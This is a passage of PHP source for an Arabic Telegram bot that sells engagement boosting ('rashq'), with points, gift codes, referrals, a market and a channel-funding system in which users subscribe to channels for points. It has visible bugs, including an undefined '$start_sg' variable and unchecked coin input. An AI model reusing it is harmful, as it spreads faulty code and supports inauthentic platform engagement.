bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"تم تعيين قناة الاثباتات [@$text] تأكد من ان البوت مشرف بالقناة 
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['mode'][$from_id]= null;
$rshq["sCh"]= "@".$text;
SETJSON($rshq);
}
}
if($data == "hdiamk" ) {
if(isAdmin($db, $chat_id) || $chat_id == $joo ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل عدد الرصيد داخل الهديه

*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"gift_settings"]],
]
])
]);
$rshq['mode'][$from_id]= "hdiMk0";
SETJSON($rshq);
}
}
if($text and $rshq['mode'][$from_id] == "hdiMk0") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ){
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"• ارسل الان عدد الاشخاص لاستخدام هذا الهديه وتحته اسم الاكود
مثلا

100
joo
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"gift_settings"]],
]
])
]);
$rshq['mode'][$from_id]= "hdiMk";
$rshq['_HD'][$from_id]= $text;
$rshq["kilwa".$rnd]= "on|$text";
SETJSON($rshq);
}
}
$rnd=rand(999,99999);
if($text and $rshq['mode'][$from_id] == "hdiMk") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ){
if($text){
$text1 = $rshq['_HD'][$from_id];
$mts = explode("\n",$text)[1];
$text = explode("\n",$text)[0];
if($mts and $text){
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"• تم صنع كود نقاط جديد ✨
----------------------------
🏷- الكود : `". $mts."`
📦- عدد الرصيد : $text1 $currency_name
👤- عدد الاشخاص : $text

🤖- بوت الرشق : [@".bot('getme','bot')->result->username. "]
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"gift_settings"]],
]
])
]);
$rshq['mode'][$from_id]= null;
$rshq[$mts]= "on|$text1|$text";
$rshq["A#D".$mts]= "$text";
SETJSON($rshq);
 }
} else {
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"ارسل *الارقام* فقط!!
 ",
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"gift_settings"]],
]
 ])
]);
}
}
}
if($data == "onrshq") {
if(isAdmin($db, $chat_id) || $chat_id == $joo) {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*تم فتح قسم الرشق
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['rshqG']= "on";
SETJSON($rshq);
} 
}

if($data == "ofrshq") {
if(isAdmin($db, $chat_id) || $chat_id == $joo) {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*تم قفل قسم الرشق
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['rshqG']= "of";
SETJSON($rshq);
}
}
if($data == "coins" ) {
if(isAdmin($db, $chat_id) || $chat_id == $joo ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل ايدي الشخص الان

*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"member_control"]],
]
])
]);
$rshq['mode'][$from_id]= "coins";
SETJSON($rshq);
}
}
if($text and $rshq['mode'][$from_id] == "coins") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ){
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>" ارسل عدد الرصيد لاضافته للشخص

اذا تريد تخصم كتب  -
مثال للخصم:  -500
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"member_control"]],
]
])
]);
$rshq['mode'][$from_id]= "coins2";
$rshq['id'][$from_id]= "$text";
SETJSON($rshq);
}
}
if($text and $rshq['mode'][$from_id] == "coins2") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ){
if($text != $rshq['id'][$from_id] ){
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"تم اضافه $text $currency_name ل". $rshq['id'][$from_id]. "",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"member_control"]],
]
])
]);
$rshq['mode'][$from_id]= null;
$rshq["coin"][$rshq['id'][$from_id]] += $text;
SETJSON($rshq);
}
}
}


$coin = $rshq["coin"][$from_id] ?? 0;
$bot_tlb = $rshq['bot_tlb'] ?? 0;
$mytl = $rshq["cointlb"][$from_id] ?? 0;
$share = $rshq["mshark"][$from_id] ?? 0;
$tlby = $rshq["tlby"][$from_id] ?? 0;
$start_message = $rshq['start_message'] ?? "مرحبا بك في بوت $nambot ![🌀](tg://emoji?id=5251203410396458957)
• هذا البوت مختص لرشق جميع البرامج ![🛒](tg://emoji?id=5337080053119336309) 

![💰](tg://emoji?id=5280943438991214029) ] رصيدك : *{balance}* {currency}
![ℹ️](tg://emoji?id=5341715473882955310) ] ايديك : `{user_id}`";
$chnl_clean = str_replace('@', '', $chnl);
$Rjoo = [
'inline_keyboard'=>[
[['text'=>"الخدمات ",'callback_data'=>"service","style"=>"danger","icon_custom_emoji_id"=>"5278436402156031854"]],
[['text'=>"تمويل القنوات ",'callback_data'=>"user_funding_main","style"=>"danger","icon_custom_emoji_id"=>"5424818078833715060"]],
[['text'=>"تجميع ️$currency_name",'callback_data'=>"plus","style"=>"danger","icon_custom_emoji_id"=>"4965219701572503640"], ['text'=>"اداره الحساب️",'callback_data'=>"acc","style"=>"danger","icon_custom_emoji_id"=>"5231200819986047254"]],
[['text'=>"استخدام كود ",'callback_data'=>"hdia","style"=>"danger","icon_custom_emoji_id"=>"5445353829304387411"], ['text'=>"تحويل نقاط️",'callback_data'=>"transer","style"=>"danger","icon_custom_emoji_id"=>"5447410659077661506"]],
[['text'=>"متابعه طلب",'callback_data'=>"infotlb","style"=>"danger","icon_custom_emoji_id"=>"5231012545799666522"],['text'=>"جميع طلباتي",'callback_data'=>"myrders","style"=>"danger","icon_custom_emoji_id"=>"5197269100878907942"]],
[['text'=>"قنوات البوت ",'callback_data'=>"user_bot_channels","style" => "primary","icon_custom_emoji_id"=>"5864127571754489150"],['text'=>"قناه الاثبتات",'url'=>"https://t.me/$chnl_clean","style" => "primary","icon_custom_emoji_id" => "5854722989240619332"]],
[['text'=>"شحن نقاط ",'callback_data'=>"buy","style" => "primary","icon_custom_emoji_id" => "5359437015752401733"],['text'=>"الشروط ",'callback_data'=>"termss","style" => "primary","icon_custom_emoji_id" => "5334544901428229844"]],
[['text'=>"قسم ماركت البوت ️",'callback_data'=>"user_market","style" => "primary","icon_custom_emoji_id" => "5895407084131848348"]],
[['text'=>"عدد الطلبات : $bot_tlb ",'callback_data'=>"نن","style" => "success","icon_custom_emoji_id" => "6296577138615125756"]],
]
];
if($data == "user_bot_channels"){
$key = ['inline_keyboard' => []];
if(isset($rshq['bot_channels']) && is_array($rshq['bot_channels'])){
foreach($rshq['bot_channels'] as $channel){
$key['inline_keyboard'][] = [['text' => $channel['name'], 'url' => $channel['link'],"style" => "danger","icon_custom_emoji_id" => "5895407084131848348"]];
}
}
$key['inline_keyboard'][] = [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*• اهلا بك في قسم قنوات البوت ![📭](tg://emoji?id=5251203410396458957) 
*• اختر القناة التي تريد الاشتراك فيها* ![🌀](tg://emoji?id=5461151367559141950) 
*
",
'parse_mode' => "markdownV2",
'reply_markup' => json_encode($key),
]);
}
if($data == "user_funding_main"){
$funding_status = $rshq['funding_status'] ?? "on";
if($funding_status == "off"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*نظام التمويل مغلق حاليا ❌
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$NamesBACK,'callback_data'=>"tobot"]],
]
])
]);
return;
}
$s3rtmoil = $rshq["s3rtmoil"]?? "12";
$idna = $tmoil["tmoils"]?? "10";
$terms = $tmoil['funding_terms'] ?? "📋 شروط التمويل:\n1. يجب أن يكون البوت مشرفاً في قناتك\n2. الحد الأدنى للتمويل هو {min_count} عضو\n3. سعر العضو الواحد {price} {currency}\n4. يتم خصم الرصيد فور إنشاء الطلب\n5. لا يمكن استرجاع الرصيد بعد إنشاء الطلب";
$terms = str_replace("{min_count}", $idna, $terms);
$terms = str_replace("{price}", $s3rtmoil, $terms);
$terms = str_replace("{currency}", $currency_name, $terms);
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => " تمويل قناتك", 'callback_data' => "tmoil-kilwa","style" => "primary","icon_custom_emoji_id" => "5895407084131848348"]];
$key['inline_keyboard'][] = [['text' => " الاشتراك في القنوات", 'callback_data' => "joins|1","style" => "primary","icon_custom_emoji_id" => "6008220984346152956"]];
$key['inline_keyboard'][] = [['text' => " قنوات تحت التمويل", 'callback_data' => "user_active_fundings","style" => "primary","icon_custom_emoji_id" => "5251203410396458957"]];
$key['inline_keyboard'][] = [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*💥 اهلا بك في قسم التمويل

$terms

📊 رصيدك الحالي: $coin $currency_name
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
if($data == "user_active_fundings"){
$buttons = [];
if(empty($tmoil['db']['chs'])){
$buttons[] = [['text' => "لا توجد قنوات تحت التمويل حالياً", 'callback_data' => "noop"]];
} else {
foreach($tmoil['db']['chs'] as $chs){
$idM = $tmoil['chanels']["id_$chs"];
$ci = $tmoil['db'][$idM]["count"];
$vx = $ci - $tmoil['db'][$idM]["startc"];
$buttons[] = [['text' => "@$chs 📡 ($vx / $ci)", 'callback_data' => "view_funding_channel|$chs"]];
}
}
$buttons[] = [['text' => "$NamesBACK", 'callback_data' => "user_funding_main"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*📡 القنوات التي تحت التمويل حالياً:
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode(['inline_keyboard' => $buttons]),
]);
}
if($data_[0] == "view_funding_channel"){
$chs = $data_[1];
$idM = $tmoil['chanels']["id_$chs"];
if(!$idM || !isset($tmoil['db'][$idM])){
bot('answerCallbackQuery', ['callback_query_id'=>$update->callback_query->id, 'text'=>"القناة غير موجودة"]);
return;
}
$ci = $tmoil['db'][$idM]["count"];
$vx = $ci - $tmoil['db'][$idM]["startc"];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*📡 تفاصيل القناة\n\nقناة: @$chs\nالعدد المطلوب: $ci\nالعدد المتبقي: $vx\n\nيمكنك الاشتراك فيها لكسب نقاط*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "✅ الاشتراك", 'callback_data' => "joins|1"]],
[['text' => "$NamesBACK", 'callback_data' => "user_active_fundings"]],
]
]),
]);
}
if($data == "user_market"){

$key = ['inline_keyboard' => []];
$row = [];

if(isset($rshq['market_sections'])){
foreach($rshq['market_sections'] as $code => $section){

$btn = [
'text' => $section['name'],
'callback_data' => "user_market_products|$code"
];

if(isset($section['emoji'])){
$btn["icon_custom_emoji_id"] = $section['emoji'];
}

$row[] = $btn;

if(count($row) == 2){
$key['inline_keyboard'][] = $row;
$row = [];
}

}
}

if(!empty($row)){
$key['inline_keyboard'][] = $row;
}

$key['inline_keyboard'][] = [[
'text'=>"$NamesBACK",
'callback_data'=>"tobot",
"style" => "danger",
"icon_custom_emoji_id" => "5449683594425410231"
]];

bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*مرحبا بك في ماركت البوت ![🛍](tg://emoji?id=5278436402156031854) 
• اختر القسم المناسب ![⭐](tg://emoji?id=5197269100878907942) 
*
",
'parse_mode' => "markdownV2",
'reply_markup' => json_encode($key),
]);

}
if(explode("|",$data)[0] == "user_market_products"){
$code = explode("|",$data)[1];
$key = ['inline_keyboard' => []];
if(isset($rshq['market_sections'][$code]['products'])){
foreach($rshq['market_sections'][$code]['products'] as $pcode => $product){
$key['inline_keyboard'][] = [['text' => $product['name']." - السعر: ".$product['price'], 'callback_data' => "buy_product|$code|$pcode"]];
}
}
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "user_market"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*قسم: ".$rshq['market_sections'][$code]['name']."*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
if(explode("|",$data)[0] == "buy_product"){
$code = explode("|",$data)[1];
$pcode = explode("|",$data)[2];
$product = $rshq['market_sections'][$code]['products'][$pcode];
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "تأكيد الشراء ✅", 'callback_data' => "confirm_buy|$code|$pcode"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "user_market_products|$code"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*المنتج: ".$product['name']."
الوصف: ".$product['description']."
السعر: ".$product['price']." $currency_name
رصيدك: $coin $currency_name
هل تريد شراء هذا المنتج؟
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
if(explode("|",$data)[0] == "confirm_buy"){
$code = explode("|",$data)[1];
$pcode = explode("|",$data)[2];
$product = $rshq['market_sections'][$code]['products'][$pcode];
if($coin >= $product['price']){
$rshq["coin"][$from_id] -= $product['price'];
$rshq["market_purchases"][$from_id][] = [
'product' => $product['name'],
'price' => $product['price'],
'time' => date('Y-m-d H:i:s'),
'section' => $rshq['market_sections'][$code]['name']
];
SETJSON($rshq);
$proof_text = $rshq['channel_proof_text'] ?? "✅ تم شراء المنتج بنجاح\nالمنتج: {product_name}\nالسعر: {price} {currency}\nالمستخدم: {user_name}\nالايدي: {user_id}";
$proof_text = str_replace("{product_name}", $product['name'], $proof_text);
$proof_text = str_replace("{price}", $product['price'], $proof_text);
$proof_text = str_replace("{currency}", $currency_name, $proof_text);
$proof_text = str_replace("{user_name}", $name, $proof_text);
$proof_text = str_replace("{user_id}", $from_id, $proof_text);
$proof_text = str_replace("{username}", $user, $proof_text);
if($chnl){
bot('sendMessage',[
'chat_id'=>$chnl,
'text'=>$proof_text,
'parse_mode'=>"markdown",
]);
}
bot('sendMessage',[
'chat_id'=>$joo,
'text'=>"🛍️ شراء جديد من الماركت\n- المنتج: ".$product['name']."\n- السعر: ".$product['price']." $currency_name\n- المشتري: [$name](tg://user?id=$from_id)\n- ايدي المشتري: `$from_id`\n- يوزر: [@$user]\n- القسم: ".$rshq['market_sections'][$code]['name'],
'parse_mode'=>"markdown",
]);
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*تم شراء المنتج بنجاح ✅
المنتج: ".$product['name']."
السعر: ".$product['price']." $currency_name
رصيدك المتبقي: ".($coin - $product['price'])." $currency_name
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "$NamesBACK", 'callback_data' => "user_market"]],
]
])
]);
}else{
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*رصيدك غير كافي للشراء ❌
رصيدك: $coin $currency_name
سعر المنتج: ".$product['price']." $currency_name
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "$NamesBACK", 'callback_data' => "user_market_products|$code"]],
]
])
]);
}
}
if($data == "myrders"){
$orders_text = "";
if(isset($rshq["orders"][$from_id])){
foreach($rshq["orders"][$from_id] as $m){
$orders_text .= $m."\n";
}
}
if($orders_text == ""){
$orders_text = "لا توجد طلبات";
}
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id' => $message_id,
'text'=>"• اهلا بك في قسم طلباتي ! 🛍
----------------------------
`$orders_text`
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
}
$JAWA = $rshq['JAWA'];
if($data == "termss"){
if($rshq['KLISHA'] == null){
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id' => $message_id,
'text'=>"• لم تتم التعين",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
}else{
$k=$rshq['KLISHA'];
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id' => $message_id,
'text'=>" $k
",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
}
}
if($data == "JAWA"){
if($rshq['JAWA'] == null) {
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id' => $message_id,
'text'=>"لم يتم تعيين كليشه
",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"linkme" ]],
]
])
]);
} else {
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id' => $message_id,
'text'=>$rshq['JAWA'],
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"linkme" ]],
]
])
]);
}
}

function parse_start_message($message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user){

$message = str_replace("{balance}", $coin, $message);
$message = str_replace("{currency}", $currency_name, $message);
$message = str_replace("{invites}", $share, $message);
$message = str_replace("{orders_count}", $tlby, $message);
$message = str_replace("{user_id}", $from_id, $message);
$message = str_replace("{first_name}", $name, $message);
$message = str_replace("{username}", $user, $message);

$message = preg_replace('/\*\*(.*?)\*\*/s', '<b>$1</b>', $message);
$message = preg_replace('/!!(.*?)!!/s', '<b>$1</b>', $message);

return $message;
}

$start_message = $rshq['start_message'] ?? "مرحبا بك في بوت !! $nambot !! <tg-emoji emoji-id=\"5251203410396458957\">🌀</tg-emoji>
• هذا البوت مختص لرشق جميع البرامج <tg-emoji emoji-id=\"5337080053119336309\">🛒</tg-emoji>
<tg-emoji emoji-id=\"5280943438991214029\">💰</tg-emoji> - رصيدك: !!{balance}!! {currency}
<tg-emoji emoji-id=\"5341715473882955310\">ℹ️</tg-emoji> - ايديك: <code>{user_id}</code>";



function handleInvite($from_id, $inviter_id, $chat_id, $name, $user, &$rshq, &$joo, $db) {
global $currency_name, $usrbot;
$coinshare_value = $rshq["coinshare"] ?? 25;
$inviter_id_clean = (int)str_replace(" ", "", $inviter_id);
$from_id_clean = (int)$from_id;
if($inviter_id_clean == $from_id_clean) {
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "⚠️ لا يمكنك استخدام رابط الدعوة الخاص بك ✅"
]);
return false;
}
if(isset($rshq["invited_users"][$from_id_clean])) {
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "ℹ️ لقد استخدمت رابط دعوة من قبل ولا يمكنك استخدام آخر"
]);
return false;
}
if(!isset($rshq["coin"][$inviter_id_clean])) $rshq["coin"][$inviter_id_clean] = 0;
if(!isset($rshq["mshark"][$inviter_id_clean])) $rshq["mshark"][$inviter_id_clean] = 0;
$rshq["coin"][$inviter_id_clean] += $coinshare_value;
$rshq["mshark"][$inviter_id_clean] += 1;
$rshq["invited_users"][$from_id_clean] = $inviter_id_clean;
if(!isset($joo_azrar['joo']['send']['uname'])) $joo_azrar['joo']['send']['uname'] = [];
if(!isset($joo_azrar['joo']['send']['add'])) $joo_azrar['joo']['send']['add'] = [];
if(!in_array($inviter_id_clean, $joo_azrar['joo']['send']['uname'])){
$joo_azrar['joo']['send']['uname'][] = $inviter_id_clean;
$joo_azrar['joo']['send']['add'][] = 1;
} else {
$yes = array_search($inviter_id_clean, $joo_azrar['joo']['send']['uname']);
$joo_azrar['joo']['send']['add'][$yes] += 1;
}
setData($db, 'joo_data', 'joo', $joo_azrar);
SETJSON($rshq);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"✅ تم تفعيل رابط الدعوة بنجاح!\n💰 لقد حصل صاحب الرابط على *$coinshare_value* $currency_name",
'parse_mode'=>"Markdown",
]);
$inviter_name = bot('getChat',['chat_id'=>$inviter_id_clean])->result->first_name ?? "المستخدم";
bot('sendMessage',[
'chat_id'=>$inviter_id_clean,
'text'=>"🎉 قام صديقك [$name](tg://user?id=$from_id_clean) بالدخول عبر رابط دعوتك!\n💰 تم إضافة *$coinshare_value* $currency_name إلى رصيدك\n📊 رصيدك الحالي: *{$rshq["coin"][$inviter_id_clean]}* $currency_name",
'parse_mode'=>"Markdown",
]);
return true;
}

$invite_code = null;
$text_clean = trim($text);
if (strpos($text_clean, "/start") === 0) {
$parts = explode(" ", $text_clean);
if (isset($parts[1])) {
$invite_code = is_numeric($parts[1]) ? (int)$parts[1] : null;
} elseif (strlen($text_clean) > 7) {
$num = substr($text_clean, 7);
$invite_code = is_numeric($num) ? (int)$num : null;
}
}
if ($invite_code === null && isset($update->message->entities)) {
foreach ($update->message->entities as $entity) {
if ($entity->type == "url" || $entity->type == "text_link") {
$url = $entity->url ?? substr($text_clean, $entity->offset, $entity->length);
if (preg_match('/[?&]start=(\d+)/', $url, $match)) {
$invite_code = (int)$match[1];
break;
}
}
}
}
$isInviteLink = ($invite_code !== null && $invite_code > 0);
$isNormalStart = ($text_clean == "/start" || $text_clean == "/start ");
$isUserStart = ($text_clean == "/stat");

if($isInviteLink || $isNormalStart) {
$inviter_id = $isInviteLink ? $invite_code : ($isNormalStart && isset($rshq['HACK'][$from_id]) ? $rshq['HACK'][$from_id] : null);
$start_msg = parse_start_message($start_message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user);
if($inviter_id && $inviter_id != $from_id && !isset($rshq["invited_users"][$from_id])) {
handleInvite($from_id, $inviter_id, $chat_id, $name, $user, $rshq, $joo, $db);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>$start_sg,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode($Rjoo)
]);
} elseif($inviter_id == $from_id) {
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"⚠️ لايمكنك الدخول لرابط الدعوه الخاص بك✅",
]);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>$start_sg,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode($Rjoo)
]);
} else {
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>$start_sg,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode($Rjoo)
]);
}
$rshq['HACKER'][$from_id] = null;
$rshq['HACK'][$from_id] = null;
SETJSON($rshq);
}
if($isUserStart) {
$start_msg = parse_start_message($start_message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>$start_msg,
'parse_mode'=>"HTML",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode($Rjoo)
]);
}
$start_msg = parse_start_message($start_message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user);
$reply_markup = [];

if (($joo_azrar['main_buttons_status'] ?? "✅") == "✅") {
$reply_markup[] = [['text'=>"الخدمات ",'callback_data'=>"service","style"=>"danger","icon_custom_emoji_id"=>"5278436402156031854"]];
$reply_markup[] = [['text'=>"تمويل القنوات ",'callback_data'=>"user_funding_main","style"=>"danger","icon_custom_emoji_id"=>"5424818078833715060"]];
$reply_markup[] = [['text'=>"تجميع ️$currency_name",'callback_data'=>"plus","style"=>"danger","icon_custom_emoji_id"=>"4965219701572503640"], ['text'=>"اداره الحساب️",'callback_data'=>"acc","style"=>"danger","icon_custom_emoji_id"=>"5231200819986047254"]];
$reply_markup[] = [['text'=>"استخدام كود ",'callback_data'=>"hdia","style"=>"danger","icon_custom_emoji_id"=>"5445353829304387411"], ['text'=>"تحويل نقاط️",'callback_data'=>"transer","style"=>"danger","icon_custom_emoji_id"=>"5447410659077661506"]];
$reply_markup[] = [['text'=>"متابعه طلب",'callback_data'=>"infotlb","style"=>"danger","icon_custom_emoji_id"=>"5231012545799666522"],['text'=>"جميع طلباتي",'callback_data'=>"myrders","style"=>"danger","icon_custom_emoji_id"=>"5197269100878907942"]];
$reply_markup[] = [['text'=>"قنوات البوت ",'callback_data'=>"user_bot_channels","style" => "primary","icon_custom_emoji_id"=>"5864127571754489150"],['text'=>"قناه الاثبتات",'url'=>"https://t.me/$chnl_clean","style" => "primary","icon_custom_emoji_id" => "5854722989240619332"]];
$reply_markup[] = [['text'=>"شحن نقاط ",'callback_data'=>"buy","style" => "primary","icon_custom_emoji_id" => "5359437015752401733"],['text'=>"الشروط ",'callback_data'=>"termss","style" => "primary","icon_custom_emoji_id" => "5334544901428229844"]];
$reply_markup[] = [['text'=>"قسم ماركت البوت ️",'callback_data'=>"user_market","style" => "primary","icon_custom_emoji_id" => "5895407084131848348"]];
$reply_markup[] = [['text'=>"عدد الطلبات : $bot_tlb ",'callback_data'=>"نن","style" => "success","icon_custom_emoji_id" => "6296577138615125756"]];

}
if($text == "/start"){

$rows = $joo_azrar['rows'] ?? [];
foreach ($rows as $row) {
$currentRow = [];
foreach ($row as $btn_id) {
if (isset($joo_azrar['joos'][$btn_id])) {
$btn = $joo_azrar['joos'][$btn_id];
$color = $btn['color'] ?? "default";
if($color == "default"){$color = "";}
$emoji = $btn['emoji'] ?? null;
if ($btn['Type'] == "callback") {
if($emoji){
$currentRow[] = ['text' => $btn['name'], 'callback_data' => $btn['mo'], 'style' => $color, 'icon_custom_emoji_id' => $emoji];
} else {
$currentRow[] = ['text' => $btn['name'], 'callback_data' => $btn['mo'], 'style' => $color];
}
} else {
if($emoji){
$currentRow[] = ['text' => $btn['name'], 'callback_data' => $btn_id, 'style' => $color, 'icon_custom_emoji_id' => $emoji];
} else {
$currentRow[] = ['text' => $btn['name'], 'callback_data' => $btn_id, 'style' => $color];
}
}
} elseif (isset($joo_azrar['links'][$btn_id])) {
$link = $joo_azrar['links'][$btn_id];
$color = $link['color'] ?? "default";
if($color == "default"){$color = "primary";}
$emoji = $link['emoji'] ?? null;
if($emoji){
$currentRow[] = ['text' => $link['name'], 'url' => $link['url'], 'style' => $color, 'icon_custom_emoji_id' => $emoji];
} else {
$currentRow[] = ['text' => $link['name'], 'url' => $link['url'], 'style' => $color];
}
}
}
if (!empty($currentRow)) {
$reply_markup[] = $currentRow;
}
}
$reply_markup = json_encode(['inline_keyboard' => $reply_markup]);
bot('sendMessage',[
'chat_id' => $chat_id,
'text' => $start_msg,
'reply_to_message_id' => $message->message_id,
'parse_mode'=>"HTML",
'reply_markup' => $reply_markup,
]);
if(!isAdmin($db, $from_id) && $from_id != $joo){
    exit;
}
}
if($data == "tobot"){
$rows = $joo_azrar['rows'] ?? [];
foreach ($rows as $row) {
$currentRow = [];
foreach ($row as $btn_id) {
if (isset($joo_azrar['joos'][$btn_id])) {
$btn = $joo_azrar['joos'][$btn_id];
$color = $btn['color'] ?? "default";
if($color == "default"){$color = "";}
$emoji = $btn['emoji'] ?? null;
if ($btn['Type'] == "callback") {
if($emoji){
$currentRow[] = ['text' => $btn['name'], 'callback_data' => $btn['mo'], 'style' => $color, 'icon_custom_emoji_id' => $emoji];
} else {
$currentRow[] = ['text' => $btn['name'], 'callback_data' => $btn['mo'], 'style' => $color];
}
} else {
if($emoji){
$currentRow[] = ['text' => $btn['name'], 'callback_data' => $btn_id, 'style' => $color, 'icon_custom_emoji_id' => $emoji];
} else {
$currentRow[] = ['text' => $btn['name'], 'callback_data' => $btn_id, 'style' => $color];
}
}
} elseif (isset($joo_azrar['links'][$btn_id])) {
$link = $joo_azrar['links'][$btn_id];
$color = $link['color'] ?? "default";
if($color == "default"){$color = "primary";}
$emoji = $link['emoji'] ?? null;
if($emoji){
$currentRow[] = ['text' => $link['name'], 'url' => $link['url'], 'style' => $color, 'icon_custom_emoji_id' => $emoji];
} else {
$currentRow[] = ['text' => $link['name'], 'url' => $link['url'], 'style' => $color];
}
}
}
if (!empty($currentRow)) {
$reply_markup[] = $currentRow;
}
}
$reply_markup = json_encode(['inline_keyboard' => $reply_markup]);
bot('EditMessageText',[
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => $start_msg,
'parse_mode'=>"HTML",
'disable_web_page_preview' => true,
'reply_markup' => $reply_markup,
]);
exit;
}
$price = $joo_azrar['joos'][$data]['mo'] ?? null;
if($price){
$price = str_replace('#name', $name, $price);
$price = str_replace('#username', "[@$username]", $price);
$price = str_replace('#id', $from_id, $price);
$price = str_replace('#coin', $rshq["coin"][$from_id] ?? 0, $price);
$price = str_replace('#coin_used', $rshq["cointlb"][$from_id] ?? 0, $price);
